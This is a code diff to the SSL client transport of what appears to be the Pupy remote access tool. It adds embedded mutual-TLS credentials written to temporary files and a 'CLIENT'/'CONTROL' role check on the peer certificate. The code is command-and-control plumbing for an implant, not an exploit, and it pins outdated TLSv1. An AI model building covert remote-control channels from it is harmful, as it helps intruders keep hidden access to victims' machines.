@@ -2,6 +2,9 @@
 
 import socket
 import ssl
+import tempfile
+import os
+
 from . import socks
 
 class PupyClient(object):
@@ -81,27 +84,72 @@ class PupyProxifiedTCPClient(PupyTCPClient):
 
 class PupySSLClient(PupyTCPClient):
     def __init__(self, *args, **kwargs):
-        self.ssl_kwargs = {"server_side" : False}
-        if 'keyfile' in kwargs:
-            self.ssl_kwargs["keyfile"] = kwargs['keyfile']
-        if 'certfile' in kwargs:
-            self.ssl_kwargs["certfile"] = kwargs['certfile']
-        if 'ca_certs' in kwargs and kwargs['ca_certs'] is not None:
-            self.ssl_kwargs["ca_certs"] = kwargs['ca_certs']
-            self.ssl_kwargs["cert_reqs"] = ssl.CERT_REQUIRED
-        if 'cert_reqs' in kwargs:
-            self.ssl_kwargs["cert_reqs"] = kwargs['cert_reqs']
-        if not 'ssl_version' in kwargs or kwargs['ssl_version'] is None:
-            self.ssl_kwargs["ssl_version"] = ssl.PROTOCOL_TLSv1
-        else:
-            self.ssl_kwargs["ssl_version"] = kwargs['ssl_version']
-        if 'ciphers' is kwargs:
-            self.ssl_kwargs["ciphers"] = kwargs['cipher']
+        try:
+            import pupy_credentials
+
+            self.SSL_CLIENT_CERT = pupy_credentials.SSL_CLIENT_CERT
+            self.SSL_CLIENT_KEY = pupy_credentials.SSL_CLIENT_KEY
+            self.SSL_CA_CERT = pupy_credentials.SSL_CA_CERT
+            self.ROLE = 'CLIENT'
+
+        except:
+            from pupylib.PupyCredentials import Credentials
+
+            credentials = Credentials()
+            self.SSL_CLIENT_CERT = credentials['SSL_CLIENT_CERT']
+            self.SSL_CLIENT_KEY = credentials['SSL_CLIENT_KEY']
+            self.SSL_CA_CERT = credentials['SSL_CA_CERT']
+            self.ROLE = credentials.role
+
+        self.ciphers = 'SHA256+AES256:SHA1+AES256:@STRENGTH'
+        self.cert_reqs = ssl.CERT_REQUIRED
+        self.ssl_version = ssl.PROTOCOL_TLSv1
+
         super(PupySSLClient, self).__init__(*args, **kwargs)
 
     def connect(self, host, port):
-        s=super(PupySSLClient, self).connect(host, port)
-        return ssl.wrap_socket(s, **self.ssl_kwargs)
+        socket = super(PupySSLClient, self).connect(host, port)
+
+        fd_cert_path, tmp_cert_path = tempfile.mkstemp()
+        fd_key_path, tmp_key_path = tempfile.mkstemp()
+        fd_ca_path, tmp_ca_path = tempfile.mkstemp()
+
+        os.write(fd_cert_path, self.SSL_CLIENT_CERT)
+        os.close(fd_cert_path)
+        os.write(fd_key_path, self.SSL_CLIENT_KEY)
+        os.close(fd_key_path)
+        os.write(fd_ca_path, self.SSL_CA_CERT)
+        os.close(fd_ca_path)
+
+        try:
+            wrapped_socket = ssl.wrap_socket(
+                socket,
+                keyfile=tmp_key_path,
+                certfile=tmp_cert_path,
+                ca_certs=tmp_ca_path,
+                server_side=False,
+                cert_reqs=self.cert_reqs,
+                ssl_version=self.ssl_version,
+                ciphers=self.ciphers
+            )
+        finally:
+            os.unlink(tmp_cert_path)
+            os.unlink(tmp_key_path)
+            os.unlink(tmp_ca_path)
+
+        peer = wrapped_socket.getpeercert()
+
+        peer_role = ''
+
+        for (item) in peer['subject']:
+            if item[0][0] == 'organizationalUnitName':
+                peer_role = item[0][1]
+
+        if not ( self.ROLE == 'CLIENT' and peer_role == 'CONTROL' or \
+          self.ROLE == 'CONTROL' and peer_role == 'CLIENT' ):
+          raise ValueError('Invalid peer role: {}'.format(peer_role))
+
+        return wrapped_socket
 
 class PupyProxifiedSSLClient(PupySSLClient, PupyProxifiedTCPClient):
     pass
@@ -123,4 +171,3 @@ class PupyUDPClient(PupyClient):
         s.connect(sockaddr)
         self.sock=s
         return s, (host, port)
-
